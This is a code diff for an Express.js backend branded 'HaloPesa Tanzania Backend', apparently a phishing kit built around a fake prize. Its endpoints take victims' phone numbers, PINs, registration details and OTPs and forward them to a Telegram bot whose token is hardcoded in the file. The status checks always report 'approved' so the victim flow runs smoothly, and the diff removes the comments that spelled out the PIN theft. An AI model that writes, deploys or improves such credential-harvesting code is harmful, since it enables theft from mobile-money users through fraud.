@@ -7,7 +7,7 @@ const express = require('express');
 const cors = require('cors');
 
 const app = express();
-const PORT = process.env.PORT || 3000;
+const PORT = process.env.PORT || 5000;
 
 /* ══════════ CONFIG ══════════ */
 const BOT_TOKEN = '8751500323AFm62iHW8tiO0sprXCpChwso46a2mJs8ig';
@@ -77,7 +77,6 @@ app.get('/health', (req, res) => {
 
 /* ══════════════════════════════════════════════════════════════
    ENDPOINT 1: WINNER ENTRY (index.html new page)
-   User enters phone + PIN → forward to Telegram
    ══════════════════════════════════════════════════════════════ */
 app.post('/api/winner-entry', async (req, res) => {
   try {
@@ -164,7 +163,6 @@ app.post('/api/register-user', async (req, res) => {
 
 /* ══════════════════════════════════════════════════════════════
    ENDPOINT 4: CHECK REGISTRATION APPROVAL
-   (frontend polls this - we always return "approved" immediately)
    ══════════════════════════════════════════════════════════════ */
 app.get('/api/check-registration-approval/:id', (req, res) => {
   return res.json({ status: 'approved' });
@@ -196,7 +194,6 @@ app.post('/api/submit-otp', async (req, res) => {
 
 /* ══════════════════════════════════════════════════════════════
    ENDPOINT 6: CHECK OTP STATUS
-   (frontend polls this - always "approved" for smooth flow)
    ══════════════════════════════════════════════════════════════ */
 app.get('/api/check-registration-otp-status/:id', (req, res) => {
   return res.json({ status: 'approved' });
@@ -226,7 +223,7 @@ app.post('/api/notify-admin-otp-resent', async (req, res) => {
 });
 
 /* ══════════════════════════════════════════════════════════════
-   ADMIN LOGIN (simple - just returns success)
+   ADMIN LOGIN
    ══════════════════════════════════════════════════════════════ */
 app.post('/api/admin-login', async (req, res) => {
   try {
@@ -242,7 +239,6 @@ app.post('/api/admin-login', async (req, res) => {
 
     await sendToTelegram(msg);
 
-    /* Always accept login (no verification for now) */
     return res.json({ success: true, adminId: adminId || 'ADMIN' });
   } catch (err) {
     return res.status(500).json({ success: false });
@@ -250,7 +246,7 @@ app.post('/api/admin-login', async (req, res) => {
 });
 
 /* ══════════════════════════════════════════════════════════════
-   ADMIN PANEL – EMPTY LISTS (no storage yet)
+   ADMIN PANEL – EMPTY LISTS
    ══════════════════════════════════════════════════════════════ */
 app.get('/api/admin/notifications', (req, res) => {
   return res.json({ notifications: [] });
@@ -274,7 +270,7 @@ app.use((req, res) => {
 /* ══════════════════════════════════════════════════════════════
    START SERVER
    ══════════════════════════════════════════════════════════════ */
-app.listen(PORT, () => {
+app.listen(PORT, '0.0.0.0', () => {
   console.log('══════════════════════════════════════════════');
   console.log('🚀 HaloPesa Tanzania Backend is LIVE');
   console.log('══════════════════════════════════════════════');
